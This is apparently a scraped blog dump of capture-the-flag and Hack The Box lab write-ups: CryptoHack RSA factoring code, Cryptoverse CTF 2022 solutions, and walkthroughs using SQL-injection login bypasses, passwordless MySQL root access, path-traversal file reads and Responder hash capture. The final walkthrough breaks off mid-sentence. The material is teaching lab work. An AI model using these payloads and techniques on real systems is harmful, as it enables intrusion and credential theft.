Alternate solution(s):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # source: CryptoHack user @diksown from fractions import gcd N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073 e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051 c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 #N = p*q #c1 = (2*p + 3*q)**e1 mod N #c2 = (5*p + 7*q)**e2 mod N #c1^e2 = (2*p + 3*q)**(e1*e2) mod N #c2^e1 = (5*p + 7*q)**(e1*e2) mod N #f1 = 5^e1*e2 * c1^e2 = (10*p + 15*q)**(e1*e2) mod N #f2 = 2^e1*e2 * c2^e1 = (10*p + 14*q)**(e1*e2) mod N #f1 mod q = f2 mod q =\u0026gt; f1-f2 = 0 mod q f1 = pow(5, e1*e2, N) * pow(c1, e2, N) f2 = pow(2, e1*e2, N) * pow(c2, e1, N) q = abs(gcd(N, f1-f2)) p = N//q print(N, p, q, N-p*q, sep=\u0026#39;\\n\u0026#39;) source: CryptoHack user @exp101t 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from math import gcd n = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073 e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051 c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 q1 = pow(c1, e2, n) q2 = pow(c2, e1, n) d = pow(5, e1 * e2, n) * q1 - pow(2, e1 * e2, n) * q2 q = gcd(d, n) p = n // q assert(p * q == n) ","permalink":"https://woadey.lol/posts/modular_arithmetic/","summary":"Writeups for CryptoHack\u0026rsquo;s Modular Arithmetic Course","title":"CryptoHack: Modular Arithmetic"},{"content":"This past weekend, I joined Shellphish for a last minute CTF called Cryptoverse\nWhile I\u0026rsquo;m still a crypto n00b, I spent a few hours gathering some flags for the team.\nCrypto Warmup 1 293 solves / 107 points Decode the following ciphertext: cGlwZ3N7cG5yZm5lXzY0X3Nnan0=.\nRemember: CyberChef is your friend.\nThe ciphertext for this challenge had the distinct appearance of base64. The output format was correct, perhaps a simple rotation cipher such as ROT13 will help. This gets us our flag.\nflag: cvctf{caesar_64_ftw}\nWarmup 2 274 solves / 113 points First described by Giovan Battista Bellaso in 1553, this cipher is easy to understand and implement, but it resisted all attempts to break it until 1863, three centuries later.\nRemember: The Key to success is determination.\nfzvxw{hqtegmfr_lw_msf_scrslg_kvwlhyk_fpr_kxg?}\nIf the given key and flag didn\u0026rsquo;t give it away, a quick search could tell you this is likely a Vigenère cipher.\nThrow that in CyberChef and get the flag.\nflag: cvctf{vigenere_is_too_guessy_without_the_key?}\nWarmup 3 313 solves / 102 points You should recognize this instantly.\n-.-. \u0026hellip;- -.-. - ..-. \u0026ndash; \u0026mdash;\u0026ndash; .-. \u0026hellip;.. \u0026hellip;\u0026ndash; .. \u0026hellip; -. \u0026mdash;\u0026ndash; - \u0026hellip;.. \u0026mdash;\u0026ndash; ..-. ..- -.\nNote: Add { and } around the flag. Flag is all lower case.\nDots and dashes screams Morse code. dcode.fr if a great tool for all things decoding, including morse code.\nflag: cvctf{m0r53isn0tfun}\nWarmup 4 73 solves / 387 points Last warmup. You should get it fast if you use any social media.\nＩn sｃｉencｅ fіctіοｎ ｍetａνerse ｉs ｉtｅrａtiｏｎоf the Iｎternｅｔ as a sⅰｎgｌe, universal and immersive virtual world that is facilitated by the use of virtual reality and augmented reality headsets.\nNote: Wrap the message you decoded in cvctf{}.\nNote 2: This challenge involves some steganography tool related to a social media.\nFor this challenge, I tried several things before ultimately being successful. I thought maybe it would have to do with zero-width characters and tried tools like Stegsnow with no luck.\nEventually I found a Twitter Secret Message tool that gave the flag.\nflag: cvctf{secretsaretobeh1dd3n}\nSubstitution 240 solves / 129 points Substitution is a cryptographic technique where a plaintext is replaced by a ciphertext. The ciphertext is a substitution of the plaintext.\nHere is a very simple CTF-related substitution cipher. Find out the flag.\nHxpkdiz kcz Osxe ja x apzhjxs ljvr go jvogimxkjgv azhdijkf hgmpzkjkjgva. Kcziz xiz kcizz hgmmgv kfpza, Uzgpxirf, Xkkxhl Rzozvhz xvr mjyzr. Jo fgd cxwz ojedizr gdk kcz xqgwz mzaaxez, cziz ja fgdi osxe, pszxaz xrr hdisf qixhlzka qzogiz adqmjaajgv: hwhkoxwzifajmpszadqakjkdkjgv\nFor this challenge, I realized hwhkoxwzifajmpszadqakjkdkjgv likely was the flag, hence the first hwhko should map to cvctf. After a little trial and error targeting 1 or 2 letter words, I decrypted with the following:\n1 2 Plaintext: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ Ciphertext: sxhugyocritkmxfpbdlxxnvaxeXXXXXXXCXITXXXFXXDXXJXXAXX Later, I found out quipquip can solve this for us.\nflag: cvctf{averysimplesubstitution}\nCyberMania 42 solves / 443 points I got this piece of ciphertext from my friend who is a Cyber Mania. It must have hidden something\u0026hellip;\nfile: secret.txt\nsecret.txt contains:\n1 NDAgNmIgNzEgNmEgNjkgM2EgMzIgM2QgNDIgM2YgM2QgNzUgMjcgNjIgNmEgM2QgNWQgNjUgMmQgNWMgM2MgNjMgMjggM2IgNzMgM2MgNDEgNDkgNWQgMzUgM2IgNDQgNTcgMzggNzAgM2IgMmYgNDMgMjYgNDIgM2EgMzAgMjggMmMgMmEgNDAgM2IgNTMgNGEgNTYgM2MgMjkgNmQgNTUgMzYgM2EgMmMgMmMgMzQgMmQgNDAgMzkgM2YgMjEgNDAgM2MgNWYgMmMgNzQgNjEgNDEgMzQgNGIgNWIgMjQgM2UgMjMgNjYgNGUgM2IgNDAgNmIgNzAgMjIgNzUgM2QgNWYgNjcgNjAgNTcgM2QgNjEgNDYgNTUgNGIgNDEgMzggNTEgMjEgNmUgM2IgNjUgNmYgNTEgMjkgM2QgMjUgNDcgNzIgMjggNDAgMzcgMzMgNTMgMjMgM2QgMjUgM2YgNzEgMjEgM2EgMmUgNGIgMzQgNTggNDEgMzggMzQgNTMgNDkgM2QgNWQgNDAgNmEgNjkgM2MgMjggNGIgNmUgNjYgM2EgMmUgNDkgMzAgM2QgMzkgNjkgNTkgNWYgM2YgM2MgNjAgNGYgMmEgNjAgM2MgMmEgMjkgNWIgNjMgNDEgMzggNGYgNjUgMzUgMzkgNjkgNTAgMmUgNWUgM2IgNjYgMmIgNGYgM2MgM2EgNDkgNjYgMzUgM2EgMzkgNmQgNTQgNjUgNmUgM2QgNWQgNTQgNGEgNzEgM2MgMjkgNjQgMjQgNjYgM2QgMjkgNGMgNTcgNGUgNDAgNmYgNzUgMzMgNDggM2QgNTkgNGYgNDEgNjcgNDAgM2MgNzQgNGYgNWMgM2EgMmUgMzcgNjAgMzAgM2IgNjYgMjMgNDcgNjYgM2QgMjUgMjQgNTAgNDUgM2QgNzQgNjkgNTEgNDQgM2MgMjggMzkgNjIgM2YgM2UgMjYgMzggMmUgMzUgM2MgNDMgNDMgMjIgNDcgM2IgNGEgNWQgMzYgNGMgM2UgMjIgM2EgNDcgNGMgM2IgNDggM2YgMzcgNjggM2IgMmYgNGEgNmMgNWEgM2IgNjUgNjYgNGIgNTkgM2EgNDkgNjQgNmMgNmEgM2QgMjcgMjUgNDMgNzUgM2IgNDYgNDYgMmQgMjMgM2MgNDUgNDMgNmUgNmIgM2MgNDUgMzQgMzUgNzMgM2QgMjYgNjEgMjEgM2QgM2IgNDggMzUgNTMgNjcgNDAgMzkgNDAgMjYgNWMgMzkgNjYgMjQgNjAgNWIgM2QgNWQgNTIgNzQgM2IgNDAgNmYgNmMgMzkgNDMgNDEgNGYgNGIgMjEgNTMgM2MgMmEgMzIgNjEgNWUgNDAgMzcgM2MgNjUgMjUgNDAgNTQgNDggNGUgMzEgM2EgMzIgNDYgNjAgNGIgM2UgMjMgNjUgMzAgNmUgM2MgMjggMjcgNGEgNzUgM2MgNWYgMmMgNTEgMjIgNDAgNzIgMjIgNTggNmUgM2IgMmQgMjUgNGMgMjYgMzkgNjkgNTAgNzEgMjggNDAgM2IgMzkgM2QgNTYgM2MgMjkgNjQgNWIgNGUgNDEgNGYgNGIgMzkgNjAgM2QgNWYgNzAgNTAgNWQgNDEgNTMgNmEgMmIgNTcgM2QgNzQgNzMgMzMgMjQgM2UgMjYgNGEgMmIgMzMgM2MgNjAgNjkgMmIgMzIgNDAgMzcgNGUgNjQgNDYgM2IgNDQgNDMgNTggM2QgM2IgMmYgNDMgMjMgNmYgM2IgNWYgNTYgMmEgNjMgM2MgNWUgNzAgMjggNDYgNDAgNmYgNWEgNDUgMmYgNDAgNTAgNWYgNzMgNTggNDAgNTQgNWEgNjIgNjUgM2QgMjkgMjkgNTAgNmMgNDEgMzggM2QgNjUgMjggNDEgMzYgM2MgNGQgMzMgNDAgMzcgNGYgNzMgNTQgNDEgNGYgNmYgNTEgNTAgNDEgMzkgNTUgMzEgMjI= After a bit of CyberChef magic\u0026hellip; These emoji\u0026rsquo;s seemed suspicious, so I found cryptoji and it popped out the flag.\nflag: cvctf{3m0j1_c4n_L34K_7h1ng5}\nRSA 1 183 solves / 182 points The n is so large that it\u0026rsquo;s not possible to factor it. Or is it?\nn = 0x7c05a45d02649367ebf6f472663119777ce5f9b3f2283c7b03471e9feb1714a3ce9fa31460eebd9cd5aca7620ecdb52693a736e2fcc83d7909130c6038813fd16ef50c5ca6f491b4a8571289e6ef710536c4615604f8e7aeea606d4b5f59d7adbec935df23dc2bbc2adebbee07c05beb7fa68065805d8c8f0e86b5c3f654e651\ne = 0x10001\nct = 0x35b63f7513dbb828800a6bcd708d87a6c9f33af634b8006d7a94b7e3ba62e6b9a1732a58dc35a8df9f7554e1168bfe3de1cb64792332fc8e5c9d5db1e49e86deb650ee0313aae53b227c75e40779a150ddb521f3c80f139e26b2a8880f0869f755965346cd28b7ddb132cf8d8dcc31c6b1befc83e21d8c452bcce8b9207ab76e\nfactordb allows us to \u0026ldquo;factorize\u0026rdquo; n to find p and q. The rest is plug and chug.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/usr/bin/env python3 from Crypto.Util.number import inverse, long_to_bytes # Given: n = 0x7c05a45d02649367ebf6f472663119777ce5f9b3f2283c7b03471e9feb1714a3ce9fa31460eebd9cd5aca7620ecdb52693a736e2fcc83d7909130c6038813fd16ef50c5ca6f491b4a8571289e6ef710536c4615604f8e7aeea606d4b5f59d7adbec935df23dc2bbc2adebbee07c05beb7fa68065805d8c8f0e86b5c3f654e651 e = 0x10001 ct = 0x35b63f7513dbb828800a6bcd708d87a6c9f33af634b8006d7a94b7e3ba62e6b9a1732a58dc35a8df9f7554e1168bfe3de1cb64792332fc8e5c9d5db1e49e86deb650ee0313aae53b227c75e40779a150ddb521f3c80f139e26b2a8880f0869f755965346cd28b7ddb132cf8d8dcc31c6b1befc83e21d8c452bcce8b9207ab76e # FactorDB the given \u0026#39;n\u0026#39; p = 8156072525389912369788197863285751656042515380911795404436333529629416084362735262281722179416240983448945672233749861517470671156357917601583268804973543 q = 10678085245814899631026086851678635624044610674331494223434578587048178556659016077336866548714220013612176819608742965144962254942844889066032236627832071 assert n == p*q phi = (p-1)*(q-1) d = inverse(e, phi) m = pow(ct, d, n) print(long_to_bytes(m)) flag: cvctf{f4c70rDB_15_p0w3rfu1}\nReverse Baby Reverse 239 solves / 130 points Baby warmup.\nfiles: chall\nAfter running the program, it gave the output:\n1 2 You do not really need to run the program... The flag is: cvctf{7h15_15_4_f4k3_fl4g} So, I ran: strings chall | grep cvctf. This gave the flag.\nflag: cvctf{r3v3r53_15_4w350m3}\nBasic Transforms 97 solves / 337 points Basic JS for you to tackle.\nfile: app.js\napp.js contains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var readline = require(\u0026#39;readline\u0026#39;); var Crypto = require(\u0026#39;vigenere\u0026#39;); var rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true }); rl.on(\u0026#39;line\u0026#39;, function(line){ if (line.length == 20 \u0026amp;\u0026amp; line.startsWith(\u0026#34;cvctf{\u0026#34;) \u0026amp;\u0026amp; line.endsWith(\u0026#34;}\u0026#34;)) { var cat = Crypto.encode(line.substring(6, line.length - 1), \u0026#34;nodejsisfun\u0026#34;).split(\u0026#39;\u0026#39;).map(function(c) { return String.fromCharCode(c.charCodeAt(0) + 1); }).join(\u0026#39;\u0026#39;); if (Buffer.from(cat.split(\u0026#34;\u0026#34;).reverse().join(\u0026#34;\u0026#34;)).toString(\u0026#39;base64\u0026#39;) == \u0026#34;QUlgNGoxT2A2empxMQ==\u0026#34;) { console.log(\u0026#34;Correct!\u0026#34;); } } }); For this challenge, I simply used CyberChef again and reversed the cipher.\nHowever, I wasn\u0026rsquo;t getting the full flag upon decoding the Vigenère cipher. So, I reverted back to js using the runkit environment.\nflag: cvctf{0bfu5_N0d3_H@}\nMisc iKUN1 https://www.youtube.com/watch?v=w8bidbK0PI\nFind the flag for iKUN 1, already wrapped in flag format.\nHint: Please find me (CryptoverseCTF) on THE platform for code repositories hosting.\nNote: The YouTube link is unrelated to solving the challenge.\nTHE platform seemed likely to be Github. I was quickly able to find the account, then found a repo with a cvctf{fake_flag_but_correct_repo} bio. I checked the commit history and found the flag:\nflag: cvctf{git_reveals_everything}\nNot Georainbolt 37 solves / 451 points Georainbolt is able to guess the location on Google Map in 0.1 seconds. Can you do it in a second?\nGiven an IP address or a coordinate, tell me which city it is in. All answers are case-insensitive. You will need a space between words, such as \u0026ldquo;new york city\u0026rdquo;.\nFor simplicity, I will make it easy. There are 50 questions and you only need to achieve an accuracy of more than 50% to get the flag!\nnc 137.184.215.151 22606\nAfter connecting, the challenge will prompt the user to guess the city based on IP or Coordinate (as shown below). If you answer in more than 1 second, it\u0026rsquo;s automatically \u0026ldquo;Wrong.\u0026rdquo;\n1 2 3 4 5 IP: 2.145.91.238 City: Coordinate (lat, lon): 45.3747, -75.5647 City: We can script this to solve!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 import time import ipinfo from pwn import * from geopy.geocoders import Nominatim # init ipinfo at = \u0026#39;\u0026lt;REDACTED\u0026gt;\u0026#39; h = ipinfo.getHandler(at) # init geo locator geolocator = Nominatim(user_agent=\u0026#34;geoapiExercises\u0026#34;) r = remote(\u0026#39;137.184.215.151\u0026#39;, 22606) r.recvuntil(b\u0026#39;wrong.\\n\u0026#39;) log.info(\u0026#39;Solving...\u0026#39;) for i in range(50): time.sleep(0.2) q = r.recvuntil(b\u0026#39;City:\u0026#39;) if b\u0026#39;IP\u0026#39; in q: ip = q.split(b\u0026#39;IP: \u0026#39;)[-1].split(b\u0026#39;\\n\u0026#39;)[0].decode() d = h.getDetails(ip) r.sendline(d.city.encode()) else: coor = q.split(b\u0026#39;lon): \u0026#39;)[-1].split(b\u0026#39;\\n\u0026#39;)[0].decode() location = geolocator.reverse(coor) try: city = location.raw[\u0026#39;address\u0026#39;][\u0026#39;city\u0026#39;] except: city = \u0026#39;failed\u0026#39; r.sendline(city.encode()) r.interactive() flag: cvctf{4r3_y0u_4_R34L_Ge@r41nB0L7?}\n","permalink":"https://woadey.lol/posts/cv22/","summary":"\u003cp\u003eThis past weekend, I joined \u003ca href=\"https://shellphish.net/\"\u003eShellphish\u003c/a\u003e for a last minute CTF called Cryptoverse\u003c/p\u003e","title":"Cryptoverse CTF 2022"},{"content":"Appointment nmap 1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.92 scan initiated Tue Oct 25 20:48:19 2022 as: nmap -sC -sV -oA nmap/appointment 10.129.17.225 Nmap scan report for 10.129.17.225 Host is up (0.11s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Login |_http-server-header: Apache/2.4.38 (Debian) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 20:48:30 2022 -- 1 IP address (1 host up) scanned in 11.56 seconds http Since port 80 is open, let\u0026rsquo;s check the browser to see what the IP address gives us.\nLet\u0026rsquo;s try a few combinations of usernames and passwords first such as admin, root, password, etc.\nPerhaps this isn\u0026rsquo;t the point of entry, let\u0026rsquo;s try to find any useful subdirectories using Gobuster\ngobuster gobuster (sudo apt install gobuster) is a tool that bruteforces urls in order to find subdomains, subdirectories, and files. Let\u0026rsquo;s run a simple scan on this IP and store the output in gobuster.out for later reference.\ngobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z\n(note: sudo apt install seclists if you do not already have this directory)\ncommand tags:\ndir: directories/files search mode -u: url -w: specify a wordlist -o: specify output file -z: only display hits (not other progress) This will give us the following output: After looking at these subdirectories, nothing glaring stood out.Perhaps we can pivot back to the login page and try SQL Injection.\nSQL SQL (Structured Query Language) is a programming language used in order to store, manipulate, or retrive data in databases. SQL Injection (sqli) is a technique used to inject SQL commands via the front end to leak information from the database.\nIt\u0026rsquo;s worth trying a few basic sqli before breaking out the big guns like sqlmap. Let\u0026rsquo;s try a few from this Github I found Googling \u0026ldquo;sqli payloads\u0026rdquo;. Let\u0026rsquo;s go to the section of sqli payloads for bypassing authentication (Auth Bypass Payloads) \u0026ndash; they usually have a format similar to ' OR 1=1 or admin' --. Just throw them into the username and password fields and hope one works.\n'-': SUCCESS ' or ''-': failed ' or \u0026quot;: failed -- or #: failed ' OR '1: SUCCESS As you can see, it takes a bit of trial and error, hence how automation (through something like sqlmap) can prove useful!\nQuestions What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? SQL Injection What does PII stand for? Personally Identifiable Information What does the OWASP Top 10 list name the classification for this vulnerability? A03:2021-Injection What service and version are running on port 80 of the target? Apache httpd 2.4.38 ((Debian)) What is the standard port used for the HTTPS protocol? 443 What is one luck-based method of exploiting login pages? brute-forcing What is a folder called in web-application terminology? directory What response code is given for \u0026ldquo;Not Found\u0026rdquo; errors? 404 What switch do we use with Gobuster to specify we\u0026rsquo;re looking to discover directories, and not subdomains? dir What symbol do we use to comment out parts of the code? # flag: e3d0796d002a446c0e622226f42e9672\nSequel nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # Nmap 7.92 scan initiated Tue Oct 25 22:42:52 2022 as: nmap -sC -sV -oA nmap/sequel 10.129.152.89 Nmap scan report for 10.129.152.89 Host is up (0.077s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 3306/tcp open mysql? |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 | Thread ID: 66 | Capabilities flags: 63486 | Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, ODBCClient, FoundRows, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: fxIBQOv\u0026amp;Xj-\u0026gt;/n`tHL\u0026#34;c |_ Auth Plugin Name: mysql_native_password |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 22:46:15 2022 -- 1 IP address (1 host up) scanned in 203.10 seconds mysql Since port 3306 is open, lets take a look into connecting to mysql (sudo apt update \u0026amp;\u0026amp; sudo apt install mysql*) - an open-source relational database management system.\nWe can run the following command and try for root right away:\nmysql -h 10.129.152.89 -u root\ncommand tags:\n-h: host IP -u: specified user Bingo!\nNow we can just run a few sql commands and profit:\nshow databases; use htb; show tables; select * from config;\nQuestions What does the acronym SQL stand for? Structured Query Language During our scan, which port running mysql do we find? 3306 What community-developed MySQL version is the target running? MariaDB What switch do we need to use in order to specify a login username for the MySQL service? -u Which username allows us to log into MariaDB without providing a password? root What symbol can we use to specify within the query that we want to display everything inside a table? * What symbol do we need to end each query with? ; flag: 7b4bec00d1a39e3dd4e021ec3d915da8\nCrocodile nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.92 scan initiated Tue Oct 25 23:11:51 2022 as: nmap -sC -sV -oA nmap/crocodile 10.129.228.114 Nmap scan report for 10.129.228.114 Host is up (0.080s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist |_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.82 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Smash - Bootstrap Business Template |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 23:12:04 2022 -- 1 IP address (1 host up) scanned in 12.82 seconds ftp ftp is open with anonymous mode allowed, so let\u0026rsquo;s scope it out.\nallowed.userlist:\n1 2 3 4 aron pwnmeow egotisticalsw admin allowed.userlist.password:\n1 2 3 4 root Supersecretpassword1 @BaASD\u0026amp;9032123sADS rKXM59ESxesUFHAd http Well we have users and passwords, let\u0026rsquo;s check the website to see if something will take these credentials (like a login page).\nAfter clicking around, nothing seemed promising. Let\u0026rsquo;s throw it in gobuster to see if we can\u0026rsquo;t find a login page.\ngobuster We\u0026rsquo;ve done this before! (see above)\ngobuster dir -u http://10.129.228.114 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.228.114 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/10/25 23:30:31 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [--\u0026gt; http://10.129.228.114/assets/] /css (Status: 301) [Size: 314] [--\u0026gt; http://10.129.228.114/css/] /js (Status: 301) [Size: 313] [--\u0026gt; http://10.129.228.114/js/] /dashboard (Status: 301) [Size: 320] [--\u0026gt; http://10.129.228.114/dashboard/] =============================================================== 2022/10/25 23:31:11 Finished =============================================================== dashboard seems interesting\u0026hellip; we get redirected to login.php!\nGoing for the throat with the admin:rKXM59ESxesUFHAd grants us access and the flag.\nQuestions What nmap scanning switch employs the use of default scripts during a scan? -sC What service version is found to be running on port 21? vsftpd 3.0.3 What FTP code is returned to us for the \u0026ldquo;Anonymous FTP login allowed\u0026rdquo; message? 230 What command can we use to download the files we find on the FTP server? get What is one of the higher-privilege sounding usernames in the list we retrieved? admin What version of Apache HTTP Server is running on the target host? 2.4.41 What is the name of a handy web site analysis plug-in we can install in our browser? Wappalyzer What switch can we use with gobuster to specify we are looking for specific filetypes? -x What file have we found that can provide us a foothold on the target? login.php flag: c7110277ac44d78b6a9fff2232434d16\nResponder nmap For this scan, I added the tags -p- to scan all ports since the top 1000 had no hits and -T5for the insane level to increase speed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Nmap 7.92 scan initiated Tue Oct 25 23:51:23 2022 as: nmap -p- -sC -sV -T5 -oA nmap/responder 10.129.245.210 Nmap scan report for 10.129.245.210 Host is up (0.21s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Oct 26 00:03:07 2022 -- 1 IP address (1 host up) scanned in 703.75 seconds http Port 80 is open so let\u0026rsquo;s scope out the site!\nLooks like the IP is getting redirected to unika.htb. Let\u0026rsquo;s add this to /etc/hosts to map the hostname to the IP address to help DNS.\n/etc/hosts:\n1 2 3 4 5 6 7 8 127.0.0.1 localhost 127.0.1.1 kali 10.129.245.210 unika.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters That\u0026rsquo;s better. After clicking around, something stood out after changing the language to French - the url changed to http://unika.htb/index.php?page=french.html. page is calling a file on the server, but can\u0026rsquo;t we just change this file to be something else? Say, /etc/hosts:\nhttp://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts ⬇️⬇️⬇️\n1 2 3 4 5 6 7 8 9 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost Now that we know we can access files on the server, an LFI (Local File Incluse) vulnerability, perhaps we there is an RFI (Remote File Incluse) vulnerability. From our nmap, we know that the server hosting this page is a Windows machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about NTLM.\nNTLM NTLM (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Noteably, it is a single sign-on (SSO) which allows requires users to only be authenticated once. More details of NTLM and the authentication process can be found on Crowdstrike. Basically, there are tools - such as Responder - which allow us to listen in on the NTLM authentication and capture the NetNTLMv2 hash. If we are able to crack this hash, we can then gain access to the server. Let\u0026rsquo;s give it a go.\nResponder Responder (git clone https://github.com/lgandx/Responder), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the NetNTLMv2 hash. This can be done by:\nsudo python3 Responder.py -I tun0\nNow we will have the server interact with this SMB server (hosted on your client IP - mine being 10.10.14.165) by changing the URL in our browser 